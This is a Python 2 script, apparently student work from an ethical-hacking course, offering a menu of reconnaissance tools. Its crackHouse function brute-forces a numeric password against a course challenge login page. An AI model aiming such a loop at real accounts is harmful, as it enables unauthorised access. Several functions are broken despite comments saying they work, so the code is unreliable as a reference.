#!/usr/bin/env python

#########################################################################
# YAPTF V0.00001 Developed for Diamond House Inc. by The Lead Developer #
#########################################################################

# Some of these might need to be installed on the system seperately:
import socket
import requests
import subprocess
import robotparser

# Features to be added: Extending the function to scan three of the most common ports (HTTP, FTP, SSH)

#def scanport(host, port):
 #   """Attempt to connect to a port on a host to see if it is open
  #  :param host: Host IP to scan
   # :param port: Port to scan
  #  """
 #   s = socket.socket()
 #   try:
 #       s.connect((host 192.168.0.1, port 8080))
 #   except socket.error:
 #       s.close()
 #       return False
#    s.close()
  #  return True


# This Has Now Have Been Fixed

def crackHouse():
    """Bruteforce the password for titanium house"""

    for item in range(600, 999):
        params = {"username":"JoeSmith", "password":item}
        r = requests.get("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php", params = params)
        if r.text.find("incorrect")!= -1 : 
            print "- ".format(item)
        else:
            print ". .".format(item)
            return item



# This has been now sorted and is now called Lord Of The Pings  

def amazingMenu():
    """ Display an amazing Banner and the Menu for the tool to instantly impress the users."""
    print '    __                   __         ____   __  __            ____  _                 ' 
    print '   / /   ____  _________/ /  ____  / __/  / /_/ /_  ___     / __ \(_)___  ____ ______'
    print '  / /   / __ \/ ___/ __  /  / __ \/ /_   / __/ __ \/ _ \   / /_/ / / __ \/ __ `/ ___/'
    print ' / /___/ /_/ / /  / /_/ /  / /_/ / __/  / /_/ / / /  __/  / ____/ / / / / /_/ (__  ) '
    print '/_____/\____/_/   \____/   \____/_/     \__/_/ /_/\___/  /_/   /_/_/ /_/\__  /____/  '
    print '                                                                       /____/        '
    print '-------------------------'
    print 'Enter your choice (1-5): '
    print '-------------------------'
    print '1) scanport'
    print '2) crackHouse'
    print '3) listRestricted'
    print '4) identifyOUI'
    print '5) generateReport'

    usr_inpt = raw_input()

    if usr_inpt == '1':
        scanport()
    elif usr_inpt == '2':
        crackHouse()
    elif usr_inpt == '3':
        listRestricted()
    elif usr_inpt == '4':
        identifyOUI()
    elif usr_inpt == '5':
        generateReport()
    else:
        print 'Invalid Option'
    
    print ('LOTP: by DiamondHouse inc.')

#This has been tweeked and is working perfectly:

def listRestricted():
    """ Return the restricted folders from a webpage based on the robots.txt file. """
    sites = ['www.google.com','www.coventry.ac.uk', 'www.yahoo.com']
    
    def getDenies(site):
        """ Create a new robotparser instance and read the site's robots file"""
        paths =[]
        robot = robotparser.RobotFileParser()
        robot.set_url("http://"+site+"/robots.txt")
        robot.read()
    

       
        print robot.entries
        print robot.default_entry

        # For each entry, look at the rule lines and add the path to paths if disallowed.
        for entry in robot.entries:
            for line in entry.rulelines:
                not line.allowance and paths.append(line.path)
        return set(paths)

    for site in sites:
        print "Denies for " +site
        print "\t" + "\n\t".join(getDenies(site))
        

def identifyOUI(macaddress):
    """This function should identify the manufacturer of a given device based on its MAC adress"""
    #This now works

    database = open("data.txt", "r")
    for line in database:
        if macaddress in line: print line
    database.close()


def generateReport():
    """This function should take all the output from the selected functionality and save it to a file of some sort."""
    # To do this, I will need to make a string global variable in each function be appended to
    
    listRestricted()
    
    file = open("LOTP-Report.txt", "w") # Creates the file on the Desktop
    file.write('LOTP - Report \n' )
    file.write('-------------- \n')
    file.write('Scanport: \n' + scanportReport)
    file.write('-------------- \n')
    file.write('Crackhouse: \n' + crackHouseReport)
    file.write('-------------- \n')
    file.write('List Restricted: \n' + listrestrictedReport)
    file.write('-------------- \n')

    #>>> Need functions to return a string value to be written to the file, so need to wait until everyone has finished <<< #
    #print scanport("127.0.0.1",8000)
    #print crackhouse()
    #print listrestricted
    
    file.close()
    
    print("Documentation generated and saved to file.")

# Below I can test all the custom functionality that I am writing, just by calling the function

if __name__ == "__main__":
    amazingMenu()
    #identifyOUI("A4:18:75")
   #print scanport("127.0.0.1",8000)
    #print crackHouse()
    #print listrestricted

